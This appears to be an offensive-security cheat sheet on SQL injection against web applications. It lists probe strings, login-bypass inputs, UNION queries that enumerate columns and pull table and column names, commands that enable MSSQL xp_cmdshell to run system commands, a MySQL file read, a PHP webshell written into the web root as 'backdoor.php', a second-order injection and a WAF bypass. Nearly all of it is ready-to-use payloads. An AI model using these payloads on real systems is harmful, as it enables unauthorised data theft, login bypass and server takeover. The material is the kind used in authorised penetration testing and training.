# SQL Injection

> SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.

### Identifying SQL Injection

First of all we need to find locations where data might pass through a database and use special SQL syntax in order to see how the application responds (usually we look for SQL syntax errors, different responses for boolean conditions or time delay responses).

{% hint style="info" %}
**Integer parameters ->** No quotes.

**String parameters ->** Single(') or Double(") quotes.
{% endhint %}

#### Examples:

```
#For http://site.com/?query=, try: 
/?q=aaa' 
/?q=aaa" 
/?q=aaa" or 1=1--+ - 
/?q=[1] 
/?q=aaa` 
/?q=aaa\ 
/?q=aaa/*'*/ 
/?q=aaa/*!1111'*/ 
/?q=aaa'||'asd'||'
/?q=aaa' and '1'='1 
/?q='or''=' 
```

### Bypass Authentication

The classic SQLi example. By providing the following input in the user input we can bypass the login of a website:

<pre><code>username: nonexistent' or 1=1;#
password: asdasd

#If the above doesn't work, try limiting the returning rows of the query to 1:
<strong>username: nonexistent' or 1=1 LIMIT 1;#
</strong>password: asdasd</code></pre>

### UNION Based

The "ORDER BY" statement can help us to enumerate how many columns are used in the query string. If there is at least 'n' columns in the query, the query is valid and the page will render without errors.

```bash
#1. Enumerate number of columns used in the query:
php?id=1 order by 1-- - #No error
php?id=1 order by 2-- - #No error
php?id=1 order by 3-- - #No error
php?id=1 order by 4-- - #Error (3 columns are used)

#2. Find which columns are displayed in the webpage:
php?id=-1 union select 1111,22222,33333-- - #Find these numbers on the web response

#3. Extract data (column 3 is displayed for this example):
#SQL Version
php?id=-1 union all select 1, 2, @@version-- -
#Information schema. It stores information about the database, like table and column names:
php?id=-1 union all select 1, 2, table_name from information_schema.tables-- -
#Column names from a specific table (users):
php?id=-1 union all select 1, 2, column_name from information_schema.columns where table_name='users'-- -
```

### SQLi to RCE

#### MSSQL:

```bash
#Check if xp_cmdshell is enabled. Else, enable it. This can output some errors, but the file should be created
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';
RECONFIGURE;

# Execute commands:
EXEC master..xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig'; //without master.. still wokrs.
```

#### MySQL:

MySQL doesn't have a procedure like MSSQL "xp\_cmdshell", but if we have the right privileges (read/write) we can try to read sensitive files or place a webshell.

```bash
#Read file:
php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')

#Write file (webshell):
php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

### Second order SQL Injection

We can try to create the following user and then log in to see if we get anything interesting:

```bash
#Register the following user:
username: username' or 1=1-- -
password: whatever
#Then try to log in with the above username/password.
```

### WAF Bypass

#### Extract table data without knowing column names:

```
union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- - 
```

**Source:** [redforce.io](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)

### SQL Injection Troubles

#### Parameter is being passed to a function

It is probably that the parameter is being passed to a function. Try adding ")" to see if it works:

```
php?q=aaa' or 1=1-- - #This doesn't work
php?q=aaa' or 1=1)-- - #This works
```